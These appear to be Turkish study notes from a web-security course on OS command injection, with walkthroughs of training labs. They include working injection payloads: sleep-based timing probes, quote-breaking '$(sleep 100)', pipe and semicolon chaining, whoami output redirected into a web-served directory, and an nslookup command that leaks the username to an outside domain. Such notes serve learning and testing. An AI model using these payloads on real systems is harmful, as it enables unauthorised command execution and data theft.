<h1 align="center">OS Command Injection</h1>

- Günümüz web uygulamalarının istisnasız, OS ile bir iletişimi vardır ve buna da ihtiyacı vardır. Bu uygulamanın belli durumlarda işletim sistemindeki diğer programlarla da etkileşime geçmesi gerekmektedir.
- Bir web sitesi bir işi 60sn içerisinde tamamlayamıyor ise, background job iş olarak yapma eğilimindedir.
- 60sn yi geçerse, alttaki TCP session’ı kopabilir tabi gönderilen header’ın connection-type ına göre belirleniyor bu.
- Burdaki web uygulaması yapacağı işin belli birtakım şartlarının olması gerekli:
    1. Req-response döngüsü içinde cevap üretemeyeceğin kadar yoğun  bir işin varsa. Bu işi, kullanıcıdan alıp background job başlatıp schedule ediyor, işim bitince ben sana mail atarım diyor. Bu iş için OS ile iletişim kurabilmesi için arkada belli başlı kodların yazılması gerekiyor.
- Bir HTTP req-response cycle içerisinde bitmeyen ama işletim sisteminin arkada yapmaya devam ettiği işlere asenkron proccessler denir.
#### İşletim Sistemi üzerinde komut çalıştırmaya ihtiyaç duyulan her noktada bir Command Line Injection bulunabilir.
- Kullanıcıdan bir parametre alırsan, bu parametreyi güvensiz bir şekilde koyarsan Command Injection olur. Alınan input kullanılan yer :
    - Output, HTML içeriğinde ise ve encoding yapmıyor ise XSS,
    - SQL sorgusunda kullanılıyorsa ve parameter bining yapmıyorsa SQLi,
    - İşletim sisteminde çalışacak komutun bir parçasında güvenli bir şekilde yer almıyorsa OS Command Injection.
#### PHP dilinde ` işareti, komut satırında komut çalıştırıyor.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/fe680a56-8dd4-41a6-ba3d-689b9e0a4852)
- "; ile kodu durdurup geri kalanında istediğini yazabilirsin
```sh
sleep 100; 
	komutu mesela
```
## Linux Tips
```sh
echo BENIM ADIM "MEHMET $(sleep 100) INCE"
```
- buradaki olay aslında çift tırnak olması
	- Linux işletim sistemi çift tırnak içerisinde $() işareti içinde mevzu gördüğünde string interpolation gerçekleştiriyor
	- Ortadaki komutun çıktısı tırnakların içine string olarak gidiyor
- " ve ; gibi işaretler input validationa takılır genellikle.
#### " ile kapatıp istedğin kodu yazabilirsin ama işte engele takılır.
- Windowsta da Powershell'i kontrol edebiliyorsan orda da yarar bu
#### Tek tırnak kullanmak gerekiyor ama yine tek tırnak kapatıp istediğin kodu enjekte edebilirsin.
### Nihai payload kodu şu şekilde:
```sh
’$(sleep 100)’
```
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/745a4f4f-de92-4544-97cd-3e8a2ff42d9b)
- Çalıştırdığın komutun çıktısını HTML içeriğinde görebiliyorsan sıkıntı yok.
- Asenkron yapılarda ise, Blind OS Command Injection gerçekleşir. Bunun için en güzel yöntem “nslookup” tır. Hem windowsta hem linuxta ortak komuttur.
    - nslookup google.com
    - Bu komut çalıştırıldığında sistemdeki default name server ne ise ona gider. Oradan root DNS’e gider, sonrasında senin dns sunucuna gelir ve loglarında görmeye başlarsın.
    - echo BENIM ADIM ‘MEHMET ‘$(nslookup $(whoami).mehmetince.net)’ INCE’
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/261b735a-c9a4-422a-8b4a-22be62a1a887)
- whoami içinde boşluk, değişik karakterler falan olmamalı. Domain, RFC protokolüne uygun bir şeyler olması lazım.
## Lab: OS Command Injection, Simple Case
- Burp suite ile bir ürün sorgusunun trafiğini yakalıyoruz.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/0a7a71eb-ee3b-4b47-bf5d-ac611b79b653)
- Stok kontrolü isteği gelince, sunucu arka taraftaki stok kontrolü ile ilgili servise gidiyor yani komut satırında komut çalıştırıyor.
- Çıktı olarak sunucu integer bir değer bekliyor o yüzden whoami çalışmadı ama sleep 10 komutu çalıştı. Tırnak koymadan yaptı
- tek tırnak “ veya ‘ koyunca Syntax hatası veriyorsa, arka tarafa parametreler yalın halde gidiyor demektir: checkstock.sh 1 2
- “” şeklindeyse, ‘ konulduğunda syntax hatası vermemesi lazım.
- ‘’ şeklindeyse, “ konulduğunda hata vermemesi lazım.
- ; echo 123; yaptığında çıktı verdi
    - [checkstock.sh](http://checkstock.sh) 1 $(whoami) yapmak yerine yani parametreye yazmak yerine,
    - proccessin outputuna veriyi koymak gerekiyor yani, std.output’a gelen data bu diyecek adam
    - pipe atıp | echo $(whoami) yapabilirsin
## Lab: Blind OS Command Injection with time delays
- Feedback verme kısmında senin formu save ediyor arka tarafa.
    - Tek tırnak ‘ atınca save etti, çift tırnak “ atınca save edemedi
    - Demek oluyor ki, arka taraftaki komut çift tırnaklar “ arasına alınmış.
    - $(sleep 10)
## Lab: Blind OS Command Injection with output redirection
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/f10f5a5d-7538-4f0b-9318-88231e067cef)
- Zaafiyet BLIND ise, kendi komutunun çıktısı yansımıyor fakat SLEEP ile zaafiyeti doğrulayabilirsin.
- Kendi komutunun çıktısını bir pathe redirection yaparsan ve o path’e de web üstünden erişebiliyor isen böylece Command Injectionu zaafiyetini sömürebilirsin.
- inputların hangisini kontrol ettiğimizi bilmiyoruz
- gidip en sona :
    - $(whoami%20>%20/var/www/images/mdisec.txt)
    - $(whoami%20>%20/var/www/images/mdisec.txt)
    - Sayfanın kaynak kodlarında .jpeg, .png gibi dosyalara bakıp seninki de orada mı diye kontrol edebilirsin.
    - payloadı yazdıktan sonra ana sayfadaki fotoğrafları yükleme URL’i üstünden GET isteğinden filename=mdisec.txt yaptığında çözülür.
    - Endpoint üstünden yüklendiği için böyle tasarlanmış lab. Fullpath verip de görebilirsin gerçek hayatta.
